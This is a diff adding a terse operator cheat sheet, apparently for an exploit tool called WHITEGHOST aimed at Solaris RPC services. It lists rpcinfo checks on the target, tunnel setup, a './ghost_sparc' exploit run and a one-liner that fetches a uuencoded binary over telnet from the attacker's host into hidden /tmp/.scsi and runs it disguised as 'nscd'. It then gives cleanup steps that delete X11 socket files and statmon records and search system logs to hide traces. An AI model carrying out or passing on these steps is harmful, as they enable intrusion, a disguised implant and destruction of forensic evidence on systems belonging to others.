@@ -1,0 +1,29 @@
+####- WHITEGHOST
+##- Check that the services are running:
+rpcinfo -n 32771 -t REMOTEIP 100024
+rpcinfo -n 32772 -t REMOTEIP 100083
+
+-tunnel
+u 111 TARGETIP
+u    100024    1   udp  32791  status
+l    100083    1   tcp  32777
+
+-rtun LOCALPORT
+
+./ghost_sparc -v s8ll REMOTEIP
+
+## 
+mkdir /tmp/.scsi;cd /tmp/.scsi; telnet LOCALIP 32377 < /dev/console |uudecode && uncompress -f nscd.Z && PATH=/tmp/.scsi nscd
+
+##- Clean!
+
+ls -la /tmp/.X11-unix
+rm -rf /tmp/.X11-unix
+
+ls -lart /var/statmon/*
+rm /var/statmon/sm/*.rec
+
+
+###- sgrep /var/adm/messages ...
+
+
